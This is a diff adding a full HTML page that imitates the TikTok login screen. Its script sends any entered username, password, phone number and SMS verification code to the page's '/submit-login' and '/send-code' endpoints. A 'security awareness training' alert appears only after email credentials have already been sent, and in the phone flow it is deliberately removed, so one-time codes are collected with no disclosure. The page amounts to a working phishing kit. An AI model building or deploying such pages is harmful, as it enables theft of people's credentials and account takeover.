@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to TikTok</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #fff;
+            color: #333;
+            min-height: 100vh;
+            padding: 20px;
+            position: relative;
+        }
+        
+        .logo-container {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            z-index: 100;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .logo img {
+            height: 48px;
+            width: auto;
+        }
+        
+        .container {
+            background: #fff;
+            border-radius: 8px;
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            margin: 80px auto 0;
+        }
+        
+        .tabs {
+            display: flex;
+            margin-bottom: 30px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        
+        .tab {
+            flex: 1;
+            padding: 15px 20px;
+            text-align: center;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            transition: all 0.3s ease;
+            font-size: 16px;
+            color: #666;
+        }
+        
+        .tab.active {
+            border-bottom-color: #ff0050;
+            color: #ff0050;
+            font-weight: 600;
+        }
+        
+        .tab:hover {
+            color: #ff0050;
+        }
+        
+        .form-container {
+            position: relative;
+        }
+        
+        .form {
+            display: none;
+        }
+        
+        .form.active {
+            display: block;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            background: #fff;
+            color: #333;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+        }
+        
+        .input-group input:focus {
+            outline: none;
+            border-color: #ff0050;
+            box-shadow: 0 0 0 2px rgba(255, 0, 80, 0.1);
+        }
+        
+        .input-group input::placeholder {
+            color: #999;
+        }
+        
+        .phone-row {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .country-code {
+            width: 120px;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            background: #fff;
+            color: #333;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        
+        .country-code:focus {
+            outline: none;
+            border-color: #ff0050;
+            box-shadow: 0 0 0 2px rgba(255, 0, 80, 0.1);
+        }
+        
+        .phone-input {
+            flex: 1;
+        }
+        
+        .button {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 15px;
+        }
+        
+        .button.primary {
+            background: #ff0050;
+            color: #fff;
+        }
+        
+        .button.primary:hover {
+            background: #e6004c;
+            transform: translateY(-1px);
+        }
+        
+        .button.primary:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .button.secondary {
+            background: #f8f9fa;
+            color: #333;
+            border: 1px solid #ddd;
+        }
+        
+        .button.secondary:hover {
+            background: #e9ecef;
+        }
+        
+        .button.secondary:disabled {
+            background: #f8f9fa;
+            color: #999;
+            cursor: not-allowed;
+        }
+        
+        .error {
+            color: #dc3545;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .success {
+            color: #28a745;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .password-container {
+            position: relative;
+        }
+        
+        .password-toggle {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #666;
+            font-size: 18px;
+        }
+        
+        .password-toggle:hover {
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo-container">
+        <div class="logo">
+            <img src="/static/logo.png" alt="TikTok Logo">
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="tabs">
+            <div class="tab active" data-tab="email">Email or username</div>
+            <div class="tab" data-tab="phone">Log in with phone</div>
+        </div>
+        
+        <div class="form-container">
+            <!-- Email Form -->
+            <form class="form active" id="email-form">
+                <div class="input-group">
+                    <label for="email">Email or username</label>
+                    <input type="text" id="email" name="email" placeholder="Email or username" required>
+                </div>
+                <div class="input-group">
+                    <label for="password">Password</label>
+                    <div class="password-container">
+                        <input type="password" id="password" name="password" placeholder="Password" required>
+                        <button type="button" class="password-toggle" id="password-toggle">👁️</button>
+                    </div>
+                </div>
+                <button type="submit" class="button primary" id="login-btn" disabled>Log in</button>
+                <div class="error" id="email-error"></div>
+            </form>
+            
+            <!-- Phone Form -->
+            <form class="form" id="phone-form">
+                <div class="input-group">
+                    <label for="phone">Phone number</label>
+                    <div class="phone-row">
+                        <select class="country-code" id="country-code">
+                            <option value="+1">🇺🇸 +1</option>
+                            <option value="+44">🇬🇧 +44</option>
+                            <option value="+33">🇫🇷 +33</option>
+                            <option value="+49">🇩🇪 +49</option>
+                            <option value="+39">🇮🇹 +39</option>
+                            <option value="+34">🇪🇸 +34</option>
+                            <option value="+31">🇳🇱 +31</option>
+                            <option value="+32">🇧🇪 +32</option>
+                            <option value="+41">🇨🇭 +41</option>
+                            <option value="+46">🇸🇪 +46</option>
+                            <option value="+47">🇳🇴 +47</option>
+                            <option value="+45">🇩🇰 +45</option>
+                            <option value="+358">🇫🇮 +358</option>
+                            <option value="+48">🇵🇱 +48</option>
+                            <option value="+420">🇨🇿 +420</option>
+                            <option value="+36">🇭🇺 +36</option>
+                            <option value="+43">🇦🇹 +43</option>
+                            <option value="+351">🇵🇹 +351</option>
+                            <option value="+353">🇮🇪 +353</option>
+                            <option value="+30">🇬🇷 +30</option>
+                            <option value="+7">🇷🇺 +7</option>
+                            <option value="+380">🇺🇦 +380</option>
+                            <option value="+86">🇨🇳 +86</option>
+                            <option value="+81">🇯🇵 +81</option>
+                            <option value="+82">🇰🇷 +82</option>
+                            <option value="+91">🇮🇳 +91</option>
+                            <option value="+61">🇦🇺 +61</option>
+                            <option value="+64">🇳🇿 +64</option>
+                            <option value="+27">🇿🇦 +27</option>
+                            <option value="+20">🇪🇬 +20</option>
+                            <option value="+234">🇳🇬 +234</option>
+                            <option value="+254">🇰🇪 +254</option>
+                        </select>
+                        <input type="tel" class="phone-input" id="phone" name="phone" placeholder="Phone number" required>
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label for="verification-code">Verification code</label>
+                    <input type="text" id="verification-code" name="verification-code" placeholder="Enter 6-digit code" maxlength="6" required>
+                </div>
+                <button type="button" class="button secondary" id="send-code-btn" disabled>Send code</button>
+                <button type="submit" class="button primary" id="phone-login-btn" disabled>Log in</button>
+                <div class="error" id="phone-error"></div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // DOM Elements
+        const tabs = document.querySelectorAll('.tab');
+        const forms = document.querySelectorAll('.form');
+        const emailForm = document.getElementById('email-form');
+        const phoneForm = document.getElementById('phone-form');
+        const loginBtn = document.getElementById('login-btn');
+        const sendCodeBtn = document.getElementById('send-code-btn');
+        const phoneLoginBtn = document.getElementById('phone-login-btn');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const phoneInput = document.getElementById('phone');
+        const codeInput = document.getElementById('verification-code');
+        const passwordToggle = document.getElementById('password-toggle');
+        
+        // Password visibility toggle
+        passwordToggle.addEventListener('click', () => {
+            const type = passwordInput.type === 'password' ? 'text' : 'password';
+            passwordInput.type = type;
+            passwordToggle.textContent = type === 'password' ? '👁️' : '🙈';
+        });
+        
+        // Tab switching
+        tabs.forEach(tab => {
+            tab.addEventListener('click', () => {
+                const targetTab = tab.dataset.tab;
+                
+                // Update active tab
+                tabs.forEach(t => t.classList.remove('active'));
+                tab.classList.add('active');
+                
+                // Update active form
+                forms.forEach(form => form.classList.remove('active'));
+                if (targetTab === 'email') {
+                    emailForm.classList.add('active');
+                    updateLoginButton();
+                } else {
+                    phoneForm.classList.add('active');
+                    updatePhoneButtons();
+                    
+                    // Preserve the success message if code was sent
+                    const phoneError = document.getElementById('phone-error');
+                    if (phoneError.classList.contains('success')) {
+                        phoneError.style.display = 'block';
+                    }
+                }
+            });
+        });
+        
+        // Input validation functions
+        function updateLoginButton() {
+            const emailValid = emailInput.value.trim() !== '';
+            const passwordValid = passwordInput.value.trim() !== '';
+            loginBtn.disabled = !(emailValid && passwordValid);
+        }
+        
+        function updatePhoneButtons() {
+            const phoneValid = phoneInput.value.trim() !== '';
+            const codeValid = codeInput.value.trim() !== '';
+            
+            sendCodeBtn.disabled = !phoneValid;
+            phoneLoginBtn.disabled = !(phoneValid && codeValid);
+        }
+        
+        // Input event listeners
+        emailInput.addEventListener('input', updateLoginButton);
+        passwordInput.addEventListener('input', updateLoginButton);
+        phoneInput.addEventListener('input', updatePhoneButtons);
+        codeInput.addEventListener('input', updatePhoneButtons);
+        
+        // Form submissions
+        emailForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
+            
+            if (!email || !password) {
+                showError('email-error', 'Please fill in all fields');
+                return;
+            }
+            
+            try {
+                const response = await fetch('/submit-login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        form_type: 'email',
+                        email: email,
+                        password: password
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    showSuccess('email-error', result.message);
+                    setTimeout(() => {
+                        alert('🎭 SECURITY AWARENESS TRAINING: This was a phishing simulation!\n\n✅ You successfully identified this as a fake login page.\n\n🔒 In real life, never enter credentials on suspicious pages.\n\n📚 Always verify URLs and check for security indicators.');
+                    }, 1000);
+                } else {
+                    showError('email-error', result.message);
+                }
+            } catch (error) {
+                showError('email-error', 'Error submitting form');
+                console.error('Error:', error);
+            }
+        });
+        
+        phoneForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const phone = phoneInput.value.trim();
+            const code = codeInput.value.trim();
+            const countryCode = document.getElementById('country-code').value;
+            
+            if (!phone || !code) {
+                showError('phone-error', 'Please fill in all fields');
+                return;
+            }
+            
+            try {
+                const response = await fetch('/submit-login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        form_type: 'phone',
+                        country_code: countryCode,
+                        phone: phone,
+                        verification_code: code
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    showSuccess('phone-error', result.message);
+                    // Remove the alert notification
+                } else {
+                    showError('phone-error', result.message);
+                }
+            } catch (error) {
+                showError('phone-error', 'Error submitting form');
+                console.error('Error:', error);
+            }
+        });
+        
+        // Send code button
+        sendCodeBtn.addEventListener('click', async () => {
+            const phone = phoneInput.value.trim();
+            const countryCode = document.getElementById('country-code').value;
+            
+            if (!phone) {
+                showError('phone-error', 'Please enter a phone number');
+                return;
+            }
+            
+            try {
+                const response = await fetch('/send-code', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        country_code: countryCode,
+                        phone: phone
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    showSuccess('phone-error', 'Verification code sent!');
+                    codeInput.focus();
+                    
+                    // Disable the send code button after successful sending
+                    sendCodeBtn.disabled = true;
+                    sendCodeBtn.textContent = 'Code Sent ✓';
+                } else {
+                    showError('phone-error', result.message);
+                }
+            } catch (error) {
+                showError('phone-error', 'Error sending code');
+                console.error('Error:', error);
+            }
+        });
+        
+        // Utility functions
+        function showError(elementId, message) {
+            const element = document.getElementById(elementId);
+            element.textContent = message;
+            element.style.display = 'block';
+            element.className = 'error';
+        }
+        
+        function showSuccess(elementId, message) {
+            const element = document.getElementById(elementId);
+            element.textContent = message;
+            element.style.display = 'block';
+            element.className = 'success';
+        }
+        
+        // Initialize
+        updateLoginButton();
+        updatePhoneButtons();
+    </script>
+</body>
+</html>
